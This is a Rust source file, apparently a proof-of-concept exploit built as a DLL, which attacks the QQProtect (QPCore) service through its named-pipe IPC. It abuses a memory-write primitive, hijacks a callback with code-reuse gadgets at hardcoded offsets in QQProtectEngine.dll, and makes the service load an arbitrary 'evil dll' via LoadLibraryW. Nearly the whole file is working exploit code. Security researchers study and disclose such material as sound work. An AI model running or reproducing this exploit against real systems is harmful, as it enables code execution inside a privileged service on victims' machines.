use std::fs::*;
use std::io::*;
use std::os::windows::prelude::OsStrExt;

use windows::core::*;
use windows::Win32::Foundation::*;
use windows::Win32::System::LibraryLoader::*;
use windows::Win32::System::SystemServices::*;
use windows::Win32::System::Console::*;

use windows_service::service::*;
use windows_service::service_manager::*;

fn get_qqprotectengine_dllbase() -> u32 {
    let manager = ServiceManager::local_computer(None::<&str>, ServiceManagerAccess::ENUMERATE_SERVICE).unwrap();
    let service = manager.open_service("QPCore", ServiceAccess::QUERY_CONFIG).unwrap();
    let service_config = service.query_config().unwrap();

    let qqprotect_exe = windows_args::ArgsOs::parse_cmd(service_config.executable_path.as_os_str()).next().unwrap();
    let qqprotectengine_dll = std::path::Path::new(&qqprotect_exe).parent().unwrap().join("QQProtectEngine.dll");

    unsafe {
        let h = LoadLibraryExW(PCWSTR(HSTRING::from(qqprotectengine_dll.as_path()).as_ptr()), HANDLE::default(), DONT_RESOLVE_DLL_REFERENCES).unwrap();
        let base = h.0 as u32;
        FreeLibrary(h);
        return base;
    }
}

fn qpcore_pub_ipc() -> File {
    return File::options()
        .read(true).write(true)
        .open(r"\\.\pipe\_QPIPC_PUB1015_").unwrap();
}

fn qpcore_private_ipc(pub_ipc: &mut File) -> File {
    let mut hdr = b"aaaaaaaallllaaaaaaaaaaaaaaaaaaaaaaaavvvvaaaaffffaaaaaaaaaaaaaaaassss".to_vec();
    hdr.chunks_exact_mut(4).for_each(
        |chunk| {
            match chunk.as_ref() {
                b"vvvv" => chunk.copy_from_slice(&1_u32.to_le_bytes()),
                b"ffff" => chunk.copy_from_slice(&500_u32.to_le_bytes()),
                _ => ()
            };
        }
    );
    
    let mut body = b"aaaappppttttaaaaaaaa".to_vec();
    body.chunks_exact_mut(4).for_each(
        |chunk| {
            match chunk.as_ref() {
                b"pppp" => chunk.copy_from_slice(&std::process::id().to_le_bytes()),
                b"tttt" => chunk.copy_from_slice(&1_u32.to_le_bytes()),
                _ => ()
            }
        }
    );

    let llll = (hdr.len() + body.len() + 4) as u32;
    let ssss = body.len() as u32;

    hdr.chunks_exact_mut(4).for_each(
        |chunk| {
            match chunk.as_ref() {
                b"llll" => chunk.copy_from_slice(&llll.to_le_bytes()),
                b"ssss" => chunk.copy_from_slice(&ssss.to_le_bytes()),
                _ => ()
            }
        }
    );

    let send = [&hdr[..], &body[..], b"tail"].concat();
    pub_ipc.write_all(&send).unwrap();

    println!("qpcore_private_ipc():");
    println!("sent 0x{:x} bytes", send.len());
    println!("{}", rhexdump::hexdump(&send));

    let mut recv = vec![0_u8; 4096];
    let recv_len = pub_ipc.read(&mut recv).unwrap();

    println!("recv 0x{:x} bytes", recv_len);
    println!("{}", rhexdump::hexdump(&recv[0..recv_len]));
    println!();

    return File::options()
        .read(true).write(true)
        .open(format!(r"\\.\pipe\QPIPC_{}", std::process::id())).unwrap();
}

fn write_addr_plus_4_at(private_ipc: &mut File, addr: u32) {
    let mut hdr = b"aaaaaaaallllaaaaaaaaaaaaaaaaaaaaaaaavvvvaaaaffffaaaaaaaaaaaaaaaassss".to_vec();
    hdr.chunks_exact_mut(4).for_each(
        |chunk| {
            match chunk.as_ref() {
                b"vvvv" => chunk.copy_from_slice(&1_u32.to_le_bytes()),
                b"ffff" => chunk.copy_from_slice(&1_u32.to_le_bytes()),
                _ => ()
            };
        }
    );
    
    let mut body = b"mmmm11118888aaaaaaaa22224444pppp".to_vec();
    body.chunks_exact_mut(4).for_each(
        |chunk| {
            match chunk.as_ref() {
                b"mmmm" => chunk.copy_from_slice(&0x4a_u32.to_le_bytes()),
                b"1111" => chunk.copy_from_slice(&1_u32.to_le_bytes()),
                b"8888" => chunk.copy_from_slice(&8_u32.to_le_bytes()),
                b"2222" => chunk.copy_from_slice(&2_u32.to_le_bytes()),
                b"4444" => chunk.copy_from_slice(&4_u32.to_le_bytes()),
                b"pppp" => chunk.copy_from_slice(&(addr - 8).to_le_bytes()),
                _ => ()
            }
        }
    );

    let llll = (hdr.len() + body.len() + 4) as u32;
    let ssss = body.len() as u32;

    hdr.chunks_exact_mut(4).for_each(
        |chunk| {
            match chunk.as_ref() {
                b"llll" => chunk.copy_from_slice(&llll.to_le_bytes()),
                b"ssss" => chunk.copy_from_slice(&ssss.to_le_bytes()),
                _ => ()
            }
        }
    );

    let send = [&hdr[..], &body[..], b"tail"].concat();
    private_ipc.write_all(&send).unwrap();

    println!("write_addr_plus_4_at(0x{:08x}):", addr);
    println!("sent 0x{:x} bytes", send.len());
    println!("{}", rhexdump::hexdump(&send));
    println!();
}

fn invoke_qpcore_callback(private_ipc: &mut File, body: &[u8]) {
    let mut hdr = b"aaaaaaaallllaaaaaaaaaaaaaaaaaaaaaaaavvvvaaaaffffaaaaaaaaaaaaaaaassss".to_vec();
    hdr.chunks_exact_mut(4).for_each(
        |chunk| {
            match chunk.as_ref() {
                b"vvvv" => chunk.copy_from_slice(&1_u32.to_le_bytes()),
                b"ffff" => chunk.copy_from_slice(&2_u32.to_le_bytes()),
                _ => ()
            };
        }
    );

    let llll = (hdr.len() + body.len() + 4) as u32;
    let ssss = body.len() as u32;

    hdr.chunks_exact_mut(4).for_each(
        |chunk| {
            match chunk.as_ref() {
                b"llll" => chunk.copy_from_slice(&llll.to_le_bytes()),
                b"ssss" => chunk.copy_from_slice(&ssss.to_le_bytes()),
                _ => ()
            }
        }
    );

    let send = [&hdr[..], &body[..], b"tail"].concat();
    private_ipc.write_all(&send).unwrap();

    println!("invoke_qpcore_callback():");
    println!("sent 0x{:x} bytes", send.len());
    println!("{}", rhexdump::hexdump(&send));

    let mut recv = vec![0_u8; 4096];
    let recv_len = private_ipc.read(&mut recv).unwrap();
    println!("recv 0x{:x} bytes", recv_len);
    println!("{}", rhexdump::hexdump(&recv[0..recv_len]));
    println!();
}

fn exploit() {
    unsafe { AllocConsole(); }

    let evil_dllpath = std::env::args().nth(1).unwrap();
    let evil_dllpath = std::path::Path::new(&evil_dllpath).canonicalize().unwrap();
    println!("evil dll: {}", evil_dllpath.display());

    let qqprotectengine_dllbase = get_qqprotectengine_dllbase();
    println!("QQProtectEngine.dll, base = 0x{:x}", qqprotectengine_dllbase);

    println!();

    let mut pub_ipc = qpcore_pub_ipc();
    let mut private_ipc = qpcore_private_ipc(&mut pub_ipc);

    write_addr_plus_4_at(&mut private_ipc, 0x0041A740 + 2); // 0x0041A740: 01 00 00 00 -> 01 00 46 a7

    let mut first_invoke = b"2222aaaaaaaaaaaa4444aaaaxxxxyyyy".to_vec();
    first_invoke.chunks_exact_mut(4).for_each(
        |chunk| {
            match chunk.as_ref() {
                b"2222" => chunk.copy_from_slice(&2_u32.to_le_bytes()),
                b"4444" => chunk.copy_from_slice(&4_u32.to_le_bytes()),
                b"xxxx" => chunk.copy_from_slice(&(qqprotectengine_dllbase + 0x12662C - 3).to_le_bytes()),
                _ => ()
            }
        }
    );
    invoke_qpcore_callback(&mut private_ipc, &first_invoke);    // QQProtectEngine.dll+12662C: 50 c9 40 00 -> a7 c9 40 00

    //
    // now QQCoreCallback would be 
    //   0x0040C9A7: 15 1C 21 41 00 | adc eax, 0x41211c
    //   0x0040C9AC: 5D             | pop ebp
    //   0x0040C9AD: C2 0C00        | ret 0xc
    //

    let mut second_invoke = b"2222aaaaaaaaaaaaRRRRaaaaxxxxyyyyaaaaaaaaaaaa".to_vec();
    second_invoke.chunks_exact_mut(4).for_each(
        |chunk| {
            match chunk.as_ref() {
                b"2222" => chunk.copy_from_slice(&2_u32.to_le_bytes()),
                b"RRRR" => chunk.copy_from_slice(&(qqprotectengine_dllbase + 0x39b0d).to_le_bytes()),  // QQProtectEngine.dll+0x39b0d : add esi, 0x2c ; push esi ; mov ecx, eax ; call edx
                b"yyyy" => {
                    let addr = unsafe { GetProcAddress(GetModuleHandleW(w!("kernel32.dll")).unwrap(), s!("LoadLibraryW")).unwrap() } as u32;
                    chunk.copy_from_slice(&addr.to_le_bytes());
                },
                _ => ()
            }
        }
    );
    second_invoke.extend(evil_dllpath.as_os_str().encode_wide().chain(Some(0)).flat_map(|c| c.to_le_bytes()));
    invoke_qpcore_callback(&mut private_ipc, &second_invoke);

    print!("Press any key to continue . . .");
    std::io::stdin().read(&mut [0u8]).unwrap();
}

#[no_mangle]
pub extern "stdcall" fn die() {
    panic!();
}

#[no_mangle]
pub extern "stdcall" fn DllMain(_: HINSTANCE, reason: u32, _: *mut u8) -> BOOL {
    if reason == DLL_PROCESS_ATTACH {
        exploit();
    }
    return TRUE;
}
